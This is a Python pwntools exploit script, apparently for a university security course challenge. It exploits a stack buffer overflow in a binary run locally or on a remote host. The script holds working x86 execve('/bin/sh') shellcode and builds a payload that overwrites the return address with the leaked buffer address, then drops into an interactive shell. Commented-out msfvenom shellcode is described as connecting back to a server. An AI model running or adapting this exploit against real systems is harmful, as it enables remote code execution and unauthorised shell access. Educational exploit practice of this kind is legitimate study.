from pwn import *
import sys

# Buffer size is not 16 on the server
ADDR_SIZE = 4
OFFSET = 12
# SHELL_CODE = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
buf = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
# Shell code generated by msfvenom
# buf = b""
# buf += b"\xd9\xc6\xd9\x74\x24\xf4\xb8\x72\xbb\x2c\x05\x5d"
# buf += b"\x29\xc9\xb1\x06\x83\xed\xfc\x31\x45\x13\x03\x37"
# buf += b"\xa8\xce\xf0\x86\x07\xf9\x1a\x58\x9c\x6e\xf2\xeb"
# buf += b"\xcb\x6e\x64\x24\x6e\x06\x1a\xb3\x8d\x15\x62"
# This shell code WORKS! AND WE CAN CONNECT TO THE SERVER! BUT WE NEED TO MAINTAIN THE CONNECTION
# buf = b""
# buf += b"\xda\xd8\xb8\x3b\x3a\xa1\x07\xd9\x74\x24\xf4\x5b"
# buf += b"\x29\xc9\xb1\x12\x31\x43\x17\x03\x43\x17\x83\xd0"
# buf += b"\xc6\x43\xf2\x17\xec\x73\x1e\x04\x51\x2f\x8b\xa8"
# buf += b"\xdc\x2e\xfb\xca\x13\x30\x6f\x4b\x1c\x0e\x5d\xeb"
# buf += b"\x15\x08\xa4\x83\x09\x83\xed\x4a\x3a\x56\x12\x6c"
# buf += b"\xed\xdf\xf3\xdc\x77\xb0\xa2\x4f\xcb\x33\xcc\x8e"
# buf += b"\xe6\xb4\x9c\x38\x97\x9b\x53\xd0\x0f\xcb\xbc\x42"
# buf += b"\xb9\x9a\x20\xd0\x6a\x14\x47\x64\x87\xeb\x08"


SHELL_CODE_LEN = len(buf)
# info(SHELL_CODE_LEN)
LOCAL_BUFF_SIZE = 512 + OFFSET - SHELL_CODE_LEN


# GDB script
gdb_script = """
break 27
break 30
continue
"""
# Prepare program
exe = "/home/k-730/COMP6841/wk2/RCE/challenge"
binary = context.binary = ELF(exe, checksec=True)
context.log_level = "DEBUG"
mainAddrInt = binary.symbols.get("main")
mainAddr = p32(mainAddrInt, "little")
context(os="linux", arch="x86")


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([exe] + argv, *a, **kwargs)


# Run the debugger
buffsize = LOCAL_BUFF_SIZE

# exit(1)
io = start()
io.recvlines(1)
io.recvuntil(b": ")
# Read in the memory given by the output
bufferAddrRaw = io.recvline().strip()
intAddr = int(bufferAddrRaw, 16)
bufferAddrBytes = intAddr.to_bytes(4, "little")
info(bufferAddrBytes)
info(
    f"Buffer address(&name) in little endian is: {str(p32(intAddr, "little"))} \nor big endian: {bufferAddrRaw}"
)

payload = buf + LOCAL_BUFF_SIZE * b"A" + bufferAddrBytes
info(
    f"Jumping to {bufferAddrBytes} in little endian form or big endian 0x{(u32(bufferAddrBytes, "big")):x}"
)
io.sendline(payload)
io.interactive()
# result = io.recvall()


# result = io.recvall(timeout=5)
# io.sendline(b"ls")
# result = io.recvall()

# print(result)


# for i in range(SHELL_CODE_LEN, 512 + OFFSET - SHELL_CODE_LEN):
#     io = start()
#     io.recvlines(1)
#     io.recvuntil(b": ")
#     # Read in the memory given by the output
#     bufferAddrRaw = io.recvline().strip()
#     intAddr = int(bufferAddrRaw, 16)
#     bufferAddrBytes = intAddr.to_bytes(8, "little")
#     info(bufferAddrBytes)
#     info(
#         f"Buffer address(&name) in little endian is: {str(p64(intAddr, "little"))} \nor big endian: {bufferAddrRaw}"
#     )
#     try:
#         payload = SHELL_CODE + i * b"A" + bufferAddrBytes
#         info(
#             f"Jumping to {bufferAddrBytes} in little endian form or big endian 0x{(u64(bufferAddrBytes, "big")):x}"
#         )
#         io.sendline(payload)
#         # io.interactive()
#         result = io.recvall(timeout=1)
#         # io.sendlxine(b"ls")
#         # result = io.recvall()
#         print(result)
#     except Exception as e:
#         print(e)
